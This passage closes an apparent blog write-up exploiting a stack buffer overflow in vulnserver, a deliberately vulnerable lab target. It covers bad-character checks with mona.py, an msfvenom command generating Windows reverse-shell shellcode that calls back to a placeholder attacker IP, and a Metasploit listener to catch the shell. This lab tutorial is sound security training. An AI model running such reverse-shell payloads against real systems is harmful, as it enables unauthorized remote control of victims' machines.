</span></span><span style="display:flex;"><span>	<span style="color:#fabd2f">print</span>(<span style="color:#b8bb26">&#34;Buffer sent&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#fe8019">except</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#fabd2f">print</span> (<span style="color:#b8bb26">&#34;Error connecting to server&#34;</span>)
</span></span><span style="display:flex;"><span>	sys<span style="color:#fe8019">.</span>exit()
</span></span></code></pre></div><p>After execution, our debugger throws an exception after landing at our <code>jmp, ESP</code> address due to our appended <code>\xCC</code> byte. We can also see the appended NOP slide that can be stepped into, confirming that our execution flow is entirely under our control!</p>
<p><img src="images/9_NOP.png" alt="NOP"></p>
<p>Time to create a <em><strong>REAL</strong></em> exploit to prove that our POC is functionally sound.</p>
<h2 id="checking-for-bad-eggs">Checking for bad eggs</h2>
<hr>
<p>Before creating our shell code, we must first check for bad characters. A easily understandable example is the character <code>\x00</code>. The reason that this character is so commonly excluded is due to it being utilized as the terminator for C style strings. If shell code were to include this character, it could disrupt the execution of the shell code by ending the buffer early.</p>
<p>To create an array of bad characters, use mona.py or find a list online. Note that we automatically assume <code>\x00</code> is a bad character for the reasons noted above.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For x64dbg</span>
</span></span><span style="display:flex;"><span>mona<span style="color:#fe8019">.</span>mona(<span style="color:#b8bb26">&#34;bytearray -cpb </span><span style="color:#b8bb26">\\</span><span style="color:#b8bb26">x00&#34;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#928374;font-style:italic">#For immunity debugger / windbg</span>
</span></span><span style="display:flex;"><span>!mona bytearray -cpb <span style="color:#b8bb26">&#34;\x00&#34;</span>
</span></span></code></pre></div><p>Modify the script by replacing your <code>\x90</code> sled with your bad character array. If there are bad characters, they will display corruption within the memory dump.</p>
<p><img src="images/10_baddies.png" alt="badchar"></p>
<p>Now that we have confirmed that there are no additional bad characters, we can move on to creating our shellcode.</p>
<h2 id="upgrading-to-shellcode">Upgrading to shellcode</h2>
<hr>
<p>For the demonstration of this lab, I will be using a simple reverse shell as our payload. To generate shellcode, one can utilize the tool <strong>msfvenom</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#fe8019">=</span>&lt;ATTACKER IP&gt; LPORT<span style="color:#fe8019">=</span>&lt;LOCAL PORT&gt; EXITFUNC<span style="color:#fe8019">=</span>thread -f python -a x86 -b <span style="color:#b8bb26">&#34;\x00&#34;</span>
</span></span></code></pre></div><p>This command will create reverse_tcp shell code, targeting the windows operation system. We will supply our attacking machine IP, alongside a chosen local port. We denote that we want the output to be pythonic, targeting the x86 architecture, while avoiding the <code>\x00</code> bad character.</p>
<p>On your linux machine, run the following commands to setup a listener for your shellcode to call back to.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfconsole
</span></span><span style="display:flex;"><span><span style="color:#928374;font-style:italic">## Following commands are within the msfconsole</span>
</span></span><span style="display:flex;"><span>use exploit/multi/handler
</span></span><span style="display:flex;"><span><span style="color:#fabd2f">set</span> payload windows/shell_reverse_tcp
</span></span><span style="display:flex;"><span><span style="color:#fabd2f">set</span> LHOST &lt;ATTACKER IP SET IN SHELLCODE&gt;
</span></span><span style="display:flex;"><span><span style="color:#fabd2f">set</span> LPORT &lt;ATTACKER LPORT SET IN SHELLCODE&gt;
</span></span><span style="display:flex;"><span>exploit
</span></span></code></pre></div><p>Finally, execute your final stage of your exploit in order to pop a shell!</p>
<p><img src="images/11_exploit.png" alt="exploit"></p>
<p>The final fuzzing and exploitation templates can be found <a href="https://github.com/XORMANCER/VulnserverScripts">here</a></p>
<p>Soon, I will be covering the other vulnerable commands within vulnserver. Stay tuned!</p>
<h2 id="references">References</h2>
<hr>
<p><a href="https://help.x64dbg.com/en/latest/">https://help.x64dbg.com/en/latest/</a></p>


    <ul>
    
    </ul>


            </section>

            <section class="page__aside">
                <div class="aside__about">
<div class="aside__about">
    
<h1 class="about__title">XOR Grimoire</h1>
<p class="about__description">The eldritch tomb breathes as you unseal its ancient bindings, forgotten curses searing your mind as you ingest its forbidden knowledge.</p>
</div>


<ul class="aside__social-links">
    
    <li>
        <a href="https://github.com/XORMANCER" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
    </li>
    
    <li>
        <a href="https://twitter.com/XORMANCER" rel="me" aria-label="Twitter" title="Twitter"><i class="fa-brands fa-twitter" aria-hidden="true"></i></a>&nbsp;
    </li>
    
    <li>
        <a href="https://www.linkedin.com/in/ev-platt-iii/" rel="me" aria-label="Linkden" title="Linkden"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
    </li>
    
</ul>
</div>
                <hr>
                <div class="aside__content">
    

                </div>
            </section>

            <footer class="page__footer"><p>
    
    
    
    
    
    
      
    
      
    
      
    
    
    
</p>
<br /><br />
<p class="copyright">Â© <a href="https://xormancer.github.io/">XORMANCER</a> (Everett Platt)</p>
<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
</footer>

        </div>
    </body>

</html>
